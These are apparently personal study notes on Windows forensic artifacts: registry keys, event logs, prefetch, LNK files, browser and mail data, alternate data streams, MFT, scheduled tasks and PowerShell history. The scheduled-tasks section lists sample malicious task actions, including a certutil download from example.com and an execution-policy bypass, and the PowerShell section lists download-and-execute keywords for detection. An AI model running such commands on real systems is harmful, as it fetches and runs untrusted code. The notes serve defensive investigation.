---
layout: post
title: "Forensics: Task 2"
tags: [note, study]
---
{% raw %}
# Task-2-Forensics
Learn about the Window Registry: instead of each software creating its own separate config file, Windows gathers all configuration information from hardware, software, users to security policies into one central database. These files are saved in binary format, usually deep in the c:\windows\system32\config folder

it controls most operations on the machine. From booting, which driver or service needs to be loaded, to storing user permissions, recording the history of USB plugging, opening files, or running any software on the system.

Key classification:

Open regedit and you will see 5 main branches

<img width="901" height="365" alt="image" src="https://github.com/user-attachments/assets/e8f852d1-f76b-4519-8fbd-fbb2d4303d23" />

HKEY_CLASSES_ROOT : save information common to the entire system

HKEY_CURRENT_USER: save information for users logging into the system

HKEY_LOCAL_MACHINE: Contains information about the system, hardware, software

HKEY_USERS: Contains information of all Users, each user is a branch with the name of that user's ID number

HKEY_CURRENT_CONFIG: Stores information about the current hardware in use

HKEY_DYN_DATA: Part of the HKEY_LOCAL_MACHINE branch

data types

REG_BINARY: binary type

- REG_DWORD: Double Word style

- REG_EXPAND_SZ: special type of expansion string. Example: "%SystemRoot%"

- REG_MULTI_SZ: special string type

- REG_SZ: standard string type

location:

HKEY_LOCAL_MACHINE\SYSTEM : save important settings, central to system configuration management. located at \system32\config\system

HKEY_LOCAL_MACHINE\SAM :save user account information. located at \system32\config\sam

HKEY_LOCAL_MACHINE\SECURITY :save security settings. located at \system32\config\security

HKEY_LOCAL_MACHINE\SOFTWARE :save software information. located at \system32\config\software

HKEY_USERS\UserProfile :save user information. located at \winnt\profiles\username

HKEY_USERS.DEFAULT :save default user information. located at \system32\config\default

transaction logs:
win does not write directly to hive, temporarily writes to .LOG1, .LOG2
Collecting evidence requires taking logs to recover deleted keys

last write time:
Each key has a time stamp to build a timeline
value is not available

Core forensics artifact:
SYSTEM\CurrentControlSet\Enum\USBSTOR: view history, inserted usb serial
UserAssist, ShimCache, Amcache: view software running history, detect malware
Run, RunOnce, Services: where malware often resides to start automatically

unallocated space:
The deleted key falls into an empty area, but using the tool can still dig it up

New win user profile location:
C:\Users\username\NTUSER.DAT : replaces old winnt
C:\Users\username\AppData\Local\Microsoft\Windows\UsrClass.dat : ​​view file and folder opening history

create backup

Step 1: press win+r type regedit > ok

<img width="488" height="297" alt="image" src="https://github.com/user-attachments/assets/cf0440b5-2631-4928-9731-6778c93657e2" />

Step 2: select file > export

<img width="883" height="538" alt="image" src="https://github.com/user-attachments/assets/a38ece83-19ea-47ad-90e5-100c90295c72" />

Step 3: In the export range section, select all > name > save

<img width="752" height="662" alt="image" src="https://github.com/user-attachments/assets/8bb4f532-5b9a-4acc-86e6-7f35f30ab84a" />

recover

Step 1: press win+r type regedit > ok

<img width="488" height="297" alt="image" src="https://github.com/user-attachments/assets/cf0440b5-2631-4928-9731-6778c93657e2" />

Step 2: select file > import

<img width="666" height="458" alt="image" src="https://github.com/user-attachments/assets/06eaa305-3d85-4f30-a74a-36a0a12fa299" />

Step 3: select the backed up file > open

<img width="977" height="587" alt="image" src="https://github.com/user-attachments/assets/f84973ac-55dc-47fe-814c-6f93db746ab9" />

Registry forensics analysis tool:

Registry Explorer: view timeline, restore deleted keys

RegRipper: run script to automatically extract artifacts

FTK Imager / KAPE: copy hive files when Windows is running, locked

Volatility: extract registry, dump SAM straight from RAM

Learn about THM's artifact

recent files:

Windows automatically maintains a list of recently opened files for each user, saved in the NTUSER hive at:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```

<img width="1365" height="735" alt="image" src="https://github.com/user-attachments/assets/28c3ac32-0fb6-40c0-8e21-0b655aeb3d76" />

Using Registry Explorer, it sorts MRU to the top, older to the bottom, the list is always last opened time

This key has sub-keys for each extension. If you want to search by a specific file type, go to the example:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.pdf
```

<img width="1187" height="702" alt="image" src="https://github.com/user-attachments/assets/957be406-d303-41bb-84a2-a8ea0b3d7ed3" />


---

office recent files:

office also maintains its own list, saved in NTUSER at:

```
NTUSER.DAT\Software\Microsoft\Office\VERSION
```

Office 2013 example:

```
NTUSER.DAT\Software\Microsoft\Office\15.0\Word
```

From office 365 onwards, bind to add the user's live ID:

```
NTUSER.DAT\Software\Microsoft\Office\VERSION\UserMRU\LiveID_####\FileMRU
```

This location always saves the full path of the file

---

shellbags:

win saves the layout of each folder when the user opens it, used to determine which files/folders have been accessed, located at:

```
USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags
USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\BagMRU
NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU
NTUSER.DAT\Software\Microsoft\Windows\Shell\Bags
```

<img width="1412" height="713" alt="image" src="https://github.com/user-attachments/assets/b3910cbc-9401-4ca8-9a22-122c9754ad9d" />

Registry Explorer doesn't show much, use ShellBag Explorer in Eric Zimmerman's tools, point to the hive file and it will parse it.

---

open/save and lastvisited dialog MRUs:

Windows remembers the user location used in the open/save file dialog, trace via:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePIDlMRU

```

<img width="947" height="707" alt="image" src="https://github.com/user-attachments/assets/1d7b93fa-a20d-4e5d-9cbc-f54f7f4504e7" />


and Lastvisited

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU
```

<img width="1082" height="497" alt="image" src="https://github.com/user-attachments/assets/338b6242-151e-4cbc-af9d-3df3106aa10d" />

---

windows explorer address/search bars:


typedpaths: registry key stores paths typed or pasted by the user directly into the address bar of windows explorer.

wordwheelquery: registry key stores keywords entered by the user into the search bar of windows explorer.
```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery
``` 

<img width="1047" height="723" alt="image" src="https://github.com/user-attachments/assets/5d53f02d-e227-4593-bd5e-09fb7249d460" />

and

<img width="907" height="722" alt="image" src="https://github.com/user-attachments/assets/86ce3b76-c66a-459a-bd0c-8439225a0c39" />


in task 8:

userassist:


Windows automatically tracks which apps users open via Windows Explorer, saving them for statistics. info includes app name, number of runs, launch time. This key maps to the GUID of each user, so each user has its own, located in NTUSER hive at:


```
NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist\{GUID}\Count
```


<img width="1063" height="701" alt="image" src="https://github.com/user-attachments/assets/3715ea71-4474-43d8-8035-eecea108975a" />


app running through cmd is not here

---

shimcache:

The original purpose is to make sure the old app can still run on the new Windows, but forensics exploits it because it tracks all the apps running on the device, located in SYSTEM hive at:

```
SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
```

save: file name, file size, last modified time of executable

Registry Explorer cannot analyze, must use AppCompatCache Parser in Eric Zimmerman's tools, output to CSV and then view with EZviewer:

```
AppCompatCacheParser.exe --csv <path to save output> -f <path to SYSTEM hive> -c <control set to parse>
```

---

amcache:

The artifact is related to shimcache, tracks the running app but saves more things, especially has the SHA1 hash of the executable so it can be used to detect malware. The hive file is located directly on the filesystem at:

```
C:\Windows\appcompat\Programs\Amcache.hve
```

The nearest info program execute is located at:

```
Amcache.hve\Root\File\{Volume GUID}\
```

save: execution path, installation time, execution time, deletion time, SHA1 hash


BAM/DAM:

**BAM** — Background Activity Monitor: tracks background app running

**DAM** — Desktop Activity Moderator: manages power consumption

Both belong to the Modern Standby system, forensics is of interest because it saves the full path and last execution time of the program, located in the SYSTEM hive at:

```
SYSTEM\CurrentControlSet\Services\bam\UserSettings\{SID}
SYSTEM\CurrentControlSet\Services\dam\UserSettings\{SID}
```

key according to SID so each user has its own data

---

in lab 9

The artifacts listed are:

device identification

Use: monitor USBs plugged into the system. This artifact stores information such as manufacturer ID, product ID, version and time the USB was plugged in to help investigators accurately identify unique devices.


<img width="1346" height="711" alt="image" src="https://github.com/user-attachments/assets/a5568959-0c37-4386-b5ee-8fe54a0dac0f" />


First/Last Time

Uses: track and provide specific timestamps about device connections and disconnections. By replacing the last 4 numbers in the path, you can find:

0064: first connection time

0066: last connection time

0067: last disconnect/unplug time

SYSTEM\CurrentControlSet\Enum\USBSTOR\Ven_Prod_Version\USBSerial#\Properties\{83da6326-97a6-4088-9453-a19231573b29}\####

My computer doesn't have USBSTOR yet because it hasn't registered that USB storage/removable drive is plugged in, so it can't be plugged in

USB device Volume Name

Use: used to find the device name of the connected drive. You can use the GUID identifier information in this key to compare with the Disk ID from the identifiers above, thereby accurately linking the names of unique devices.

SOFTWARE\Microsoft\Windows Portable Devices\Devices

<img width="1912" height="1074" alt="image" src="https://github.com/user-attachments/assets/46d0d5b6-4b6d-4317-ac9e-7c6efefa24d2" />

Learn deeply about forensic artifacts

1. event logs

Uses:
event logs are windows activity logs. This artifact is used to see what happened to the system, who logged in, when, what errors occurred, and whether services, powershell, rdp or scheduled tasks were running.

location:

C:\Windows\System32\winevt\Logs\

<img width="1016" height="973" alt="image" src="https://github.com/user-attachments/assets/e9249af7-3364-44ba-a395-a590de832dff" />


Common files:


Security.evtx


<img width="813" height="73" alt="image" src="https://github.com/user-attachments/assets/fe063d5e-e00e-4aca-b387-c8990d8263fe" />


System.evtx


<img width="461" height="55" alt="image" src="https://github.com/user-attachments/assets/2e9e979c-fd73-4dc3-9209-9fc85d8d80bd" />


Application.evtx


<img width="517" height="88" alt="image" src="https://github.com/user-attachments/assets/68336318-d5a3-42a5-9051-1ec3997b0973" />



Microsoft-Windows-PowerShell%4Operational.evtx


<img width="750" height="108" alt="image" src="https://github.com/user-attachments/assets/9e558edf-3866-47aa-9d87-e86f8e773965" />


Windows PowerShell.evtx


<img width="807" height="94" alt="image" src="https://github.com/user-attachments/assets/2cfb520d-4fbd-4fc4-87b3-fae3e3d0d09b" />


Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx


<img width="793" height="150" alt="image" src="https://github.com/user-attachments/assets/14186fa8-00e8-414d-a2bf-559f55ef51e6" />



what to look for:
Security.evtx: log in, log out, user, admin rights
System.evtx: soi service, driver, shutdown, startup
PowerShell logs: look at powershell commands/scripts
TaskScheduler logs: shows tasks created, edited, deleted, and run
TerminalServices logs: soi RDP

Common event id:

4624 = successful login
4625 = login failed
4634 = log out
4648 = login with specific credential
4672 = account has special permissions
4720 = create user
4726 = delete user
4732 = add user to group
7045 = new service installed
1149 = RDP authentication successful
21 = RDP session logon
23 = RDP session logoff
106 = task is registered
200 = task action started
201 = task action completed
4104 = powershell script block logging

tool:
Event Viewer


<img width="600" height="395" alt="image" src="https://github.com/user-attachments/assets/d29984ec-29db-4727-a9fc-ce81c8b10b59" />


EvtxECmd


<img width="1024" height="497" alt="image" src="https://github.com/user-attachments/assets/4e0548ca-3f3a-4159-9c06-fb328a83b66d" />


note:
Event logs are artifacts that should be looked at first when building a timeline. It tells the main context: who entered the machine, how, when, and what system actions occurred.


2. prefetch


<img width="997" height="995" alt="image" src="https://github.com/user-attachments/assets/6e782769-91eb-49a6-8185-f2a85fee30e0" />


Uses:
prefetch is used to determine which programs have been running on the computer. It stores the executable name, number of runs, last run time and some files/dlls loaded when the program runs.

location:

C:\Windows\Prefetch\

file has the form:

POWERSHELL.EXE-xxxxxxxx.pf

CMD.EXE-xxxxxxxx.pf

CHROME.EXE-xxxxxxxx.pf

MALWARE.EXE-xxxxxxxx.pf

what to look for:
- The name of the exe file that was run
- run count
- last execution time
- previous execution times
- related path/file is loaded
- volume information

tool:
PECmd

<img width="718" height="377" alt="image" src="https://github.com/user-attachments/assets/fe40cb7f-1b83-451e-a44d-e181437eb832" />


 WinPrefetchView


<img width="293" height="172" alt="image" src="https://github.com/user-attachments/assets/b7f84207-ae64-4cbd-8d48-cefc7e563037" />


Timeline Explorer


<img width="1274" height="761" alt="image" src="https://github.com/user-attachments/assets/59e4288e-e039-4ed9-bbf8-759f84cf3a54" />


note:
prefetch is very powerful in proving that an exe file was ever run, even if the original file has been deleted. But on windows server or machine with prefetch turned off, this artifact may not be present.


3. lnk files

Uses:
lnk is the file shortcut. Windows often creates lnk when the user opens a recent file. This artifact helps know which file the user has opened, where that file is located, whether it is on a USB/network share, and sometimes saves the volume label, serial, and hostname.

location:

C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Recent\


<img width="1010" height="989" alt="image" src="https://github.com/user-attachments/assets/7eafa652-82f6-4250-b413-a61c14c05ca1" />


office recent:

C:\Users\<user>\AppData\Roaming\Microsoft\Office\Recent\

pinned/taskbar:

C:\Users\<user>\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\


<img width="970" height="919" alt="image" src="https://github.com/user-attachments/assets/b118b2a6-217e-4e01-80fc-370884ff7d06" />


what to look for:
- target path
- working directory
- command line arguments
- create/modified/accessed time of target
- lnk MAC time
- volume label
- volume serial number
- drive type
- network path
- machine id / hostname

For example:
E:\secret\report.docx
\\192.168.1.10\share\payload.exe

tool:
- LECmd
- JumpList Explorer
- KAPE
- FTK Imager
- Autopsy

note:
lnk is extremely useful when the original file has been deleted. it can still retain the old path, file name, drive, usb label or network share that was opened.


4. browser history

Uses:
Browser history is used to investigate the user's web activities: what website has he visited, what file has he downloaded, where did he download it from, where did he save it, what did he search for, are there any cookies/sessions/cache.

chrome or Cococ location:

C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\


<img width="1002" height="955" alt="image" src="https://github.com/user-attachments/assets/e902a96b-7d77-4fb5-b780-384b8e2a05e3" />


edge position:

C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\


<img width="1012" height="960" alt="image" src="https://github.com/user-attachments/assets/6b1057c7-d5e1-4ffe-8487-04a1da5ae55b" />


Important files chrome/edge:


History

Cookies

Login Data

Web Data

Cache\

Code Cache\

Network\


what to look for:
- visited url
- visit time
- typed count
- download path
- download source url
- search keyword
- cookies
- cache
- suspicious extensions

table chrome/edge hay soi:

urls

visits

downloads

downloads_url_chains

keyword_search_terms

tool:
- DB Browser for SQLite
- Hindsight
- BrowsingHistoryView
- Browser History Capturer
- NirSoft tools
- KAPE

note:
browser history helps track malware/phishing/webmail/cloud download behavior. When you see a malicious file in Downloads, you should check your browser to see which URL it downloaded from.


5. ost/pst file

Uses:
ost/pst is the data file of microsoft outlook. Used to analyze emails, attachments, sent/received mail, deleted mail, calendar, contacts and phishing/exfil signs via email.

different:
OST = Offline Storage Table, usually cache from Exchange/Office 365/IMAP
PST = Personal Storage Table, usually a personal archive/export file

OST location:

C:\Users\<user>\AppData\Local\Microsoft\Outlook\

<img width="1006" height="716" alt="image" src="https://github.com/user-attachments/assets/56a19425-4081-4d63-ba66-a8c01c6b6e44" />


PST location:

C:\Users\<user>\Documents\Outlook Files\


<img width="988" height="963" alt="image" src="https://github.com/user-attachments/assets/9e10254b-268d-4958-89ee-70eb4c72520b" />


or where the user saves themselves.

what to look for:
- inbox/sent/deleted
- subject
- sender
- recipient
- cc/bcc
- timestamp
- attachment
- message-id
- conversation thread
- calendar
- contacts
- deleted mail if not purge

tool:
- Outlook
- Xst Reader
- Kernel OST Viewer
- PST Viewer
- Aid4Mail
- FTK Imager
- Autopsy
- Magnet AXIOM

note:
ost/pst is very important when suspecting phishing or exfil via mail. You should check sent items, deleted items and attachments.


6. eml file

Uses:
eml is a raw message email file. it contains header, body, MIME structure and attachment. Used a lot when analyzing phishing emails or individual email exports.

location:
does not have a fixed location, usually located in:

C:\Users\<user>\Downloads\
C:\Users\<user>\Desktop\
C:\Users\<user>\Documents\
email export folder

what to look for:
- From
- To
- Cc/Bcc
- Subject
- Date
- Message-ID
- Received chain
- Reply-To
- Return-Path
- DKIM-Signature
- Authentication-Results
- X-Originating-IP
- Content-Type
- MIME boundary
- attachment filename
- url trong body

tool:
- Thunderbird
- emlAnalyzer
- CyberChef
note:
With eml phishing, don't just look at From. must look for Received chain, Reply-To, Return-Path, Authentication-Results and attachment/url in the body.


7. alternate data stream

Uses:
alternate data stream, abbreviated ADS, is a feature of NTFS that allows a file to have an additional hidden data stream. Attackers can hide payloads or scripts in ADS.

For example:

note.txt:hidden.exe
test.txt:hidden.ps1

location:
ADS is not in a separate folder. it mounts directly to files on NTFS partitions.

For example:

C:\Users\Public\readme.txt:payload.exe
C:\Temp\test.txt:hidden.ps1

How to check using cmd:

dir /r

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/2a3dd734-eba2-4585-9fd4-8cedcad9a781" />


How to test using powershell:

Get-Item -Path .\file.txt -Stream *
Get-Content .\file.txt -Stream hidden


<img width="1423" height="751" alt="image" src="https://github.com/user-attachments/assets/a25a98b0-bdab-4199-970b-8c0e1d45d3d7" />


what to look for:
- stream name
- stream size
- file host
- stream content
- Zone.Identifier

Zone.Identifier:
This is a common ADS, indicating whether the file is sourced from the internet or not.

For example:

download.exe:Zone.Identifier

may contain:

ZoneId=3
ReferrerUrl=
HostUrl=

tool:
- dir /r
- PowerShell Get-Item -Stream
- streams.exe
- MFTECmd
- FTK Imager
- Autopsy

note:
ADS is often overlooked because the file cannot be seen normally. When encountering a suspicious file on NTFS, you should run dir /r or streams.exe to check.


8. RDP Cache

Uses:
RDP Cache saves bitmap image fragments when users use Remote Desktop. This artifact can help restore part of the remote screen that the user has seen.

location:

C:\Users\<user>\AppData\Local\Microsoft\Terminal Server Client\Cache\

Common files:

Cache0000.bin
Cache0001.bin
bcache22.bmc
bcache24.bmc

what to look for:
- remote screen fragment
- application window
- file name displayed
- terminal output
- IP address/hostname if appears on the interface
- The attacker tool opens during the RDP session

tool:
- BMC-Tools
- RdpCacheStitcher
- RDP Cache Stitcher

note:
RDP Cache does not always reconstruct beautifully. it is often used as supporting evidence, especially when a screenshot from a remote session is needed.


9. MFT

Uses:
MFT, or Master File Table, is the main file management table of NTFS. Almost every file/folder on an NTFS partition has a record in the MFT. Used to know when a file existed, was deleted, renamed, created/edited/accessed.

location:

location: Hidden at the root of any NTFS formatted partition (Example logical path: C:\$MFT). This file is locked at the kernel level of the operating system, cannot be seen or accessed through regular File Explorer, but must be extracted through physical disk reading tools.


<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/85b9da67-065a-4abc-b1ca-c2e1eb3c9e95" />


what to look for:
- filename
- full path if reconstructable
- file size
- allocated/deleted status
- MFT entry number
- parent entry number
- resident/non-resident data
- ADS information
- timestamps

important timestamp:

$STANDARD_INFORMATION
$FILE_NAME

Each group usually has:

Created
Modified
MFT Changed
Accessed

tool:
- MFTECmd
- MFTExplorer
- AnalyzeMFT
- Autopsy
- FTK Imager
- KAPE
- Timeline Explorer

MFT to build a timeline file system. it can show that the file once existed even though it is now deleted. When suspecting timestomping, you should compare the timestamp between $STANDARD_INFORMATION and $FILE_NAME.


10. scheduled tasks

Uses:
Scheduled tasks are used to automatically run programs according to a schedule or trigger. In for, this artifact is very important because malware often uses it for persistence.

task XML location:

C:\Windows\System32\Tasks\

<img width="954" height="1048" alt="image" src="https://github.com/user-attachments/assets/880187f2-f498-4ba4-9b66-40946da5c98b" />

registry location:

HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks

<img width="908" height="732" alt="image" src="https://github.com/user-attachments/assets/676fb57f-5780-4a2b-bd61-0ec989fa2ede" />


HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree

<img width="1186" height="718" alt="image" src="https://github.com/user-attachments/assets/8bb50026-72f0-4f47-a1aa-9dcfece59a68" />


event log:

C:\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler%4Operational.evtx

what to look for:
- task name
- author
- user id
- run level
- trigger
- action
- command
- arguments
- working directory
- created time
- modified time
- last run time
- next run time

suspicious action:

powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\a.ps1
cmd.exe /c certutil -urlcache -f http://example.com/a.exe a.exe
wscript.exe C:\Users\Public\run.vbs
rundll32.exe C:\ProgramData\evil.dll,Start

tool:
- Task Scheduler
- Autoruns
- Registry Explorer
- EvtxECmd
- KAPE

note:
When you see malware running again after reboot, you should look for scheduled tasks with Run/RunOnce/Services. Tasks can be deleted, so you need to look at the TaskScheduler event log.


11. powershell history

Uses:
powershell history saves user commands entered during a PowerShell interactive session. This artifact helps know what commands the attacker/user has typed.

location:

C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/b9f6b8ea-7f0a-4ab1-bfe4-6a6364480b21" />


what to look for:
- file download command
- command to run script
- encoded command
- bypass execution policy
- disable defender
- create scheduled tasks
- create registry persistence
- create user
- call web request

Notable commands:

Invoke-WebRequest

iwr

wget

curl

Invoke-Expression

iex

DownloadString

FromBase64String

-EncodedCommand

-enc

Start-Process

New-ItemProperty

Set-ItemProperty

Add-MpPreference

Set-MpPreference

New-ScheduledTask

schtasks

Related artifacts:

C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx

<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/39fbcc37-8790-4a22-b4ad-40c901ac8826" />


C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx

<img width="1919" height="1023" alt="image" src="https://github.com/user-attachments/assets/406ad9dd-9be0-4393-8ea1-0cc411b9a54b" />



tool:
- Notepad
- Timeline Explorer
- EvtxECmd
- Chainsaw
- Hayabusa
- CyberChef

note:
Powershell history can be deleted very easily, so don't rely on it alone. Must also compare event logs 4103/4104, prefetch, scheduled tasks and MFT.

lab Windowns Fudamentals 1
```
https://github.com/nhut120c-boop/Lab-Windows-Fundamentals-1/blob/main/README.md
```
lab Windowns Fudamentals 2
```
https://github.com/nhut120c-boop/Windows-Fundamentals-2/blob/main/README.md
```
Investigating-Windows
```
https://github.com/nhut120c-boop/study-notes/tree/main/TryHackMe/Investigating-Windows
```

tool Autopsy
```
https://github.com/nhut120c-boop/study-notes/tree/main/Forensics/Tool

```
Hireme lab
```
https://github.com/nhut120c-boop/study-notes/blob/main/Forensics/HireMe%20Lab/REAME.md
```
Chall: 
```
https://github.com/nhut120c-boop/study-notes/tree/main/Forensics/Basic-Disk
```

{% endraw %}